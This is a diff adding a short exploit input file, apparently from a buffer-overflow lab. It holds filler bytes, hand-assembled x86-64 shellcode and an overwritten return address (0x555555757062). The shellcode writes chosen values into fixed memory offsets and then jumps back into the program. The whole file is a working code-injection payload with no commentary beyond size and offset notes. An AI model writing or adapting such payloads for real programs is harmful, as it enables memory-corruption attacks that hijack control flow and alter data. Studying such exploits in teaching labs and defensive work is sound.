@@ -1,0 +1,25 @@
+# total size: 270 || size of obj code: 6e = 110 || return address: 8 || size of fill: 152
+# ----+----1----+----2----+----3----+----4----+----5----+----6----+----7----+----8----+----9----+----A 
+S BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+# code
+X 48 b8 c0 74 75 55 55 55 00 00
+X 48 b8 c0 74 75 55 55 55 00 00 
+X c7 80 94 00 00 00 64 00 00 00 
+X c7 80 24 02 00 00 64 00 00 00 
+X c7 80 b4 03 00 00 64 00 00 00 
+X c7 80 44 05 00 00 64 00 00 00 
+X c7 80 d4 06 00 00 09 00 00 00 
+X c7 80 64 08 00 00 09 00 00 00 
+X c7 80 f4 09 00 00 09 00 00 00 
+X c7 80 84 0b 00 00 09 00 00 00 
+X c7 80 14 0d 00 00 64 00 00 00 
+X c7 80 a4 0e 00 00 64 00 00 00
+X c7 80 34 10 00 00 64 00 00 00
+X 48 bd 10 e9 ff ff ff 7f 00 00
+X 48 b8 f0 85 75 55 55 55 00 00
+X 83 00 42  
+X 48 ba 21 4b 55 55 55 55 00 00 
+X ff e2 
+S BBBBBBBBBB 
+# return address
+A 0x555555757062
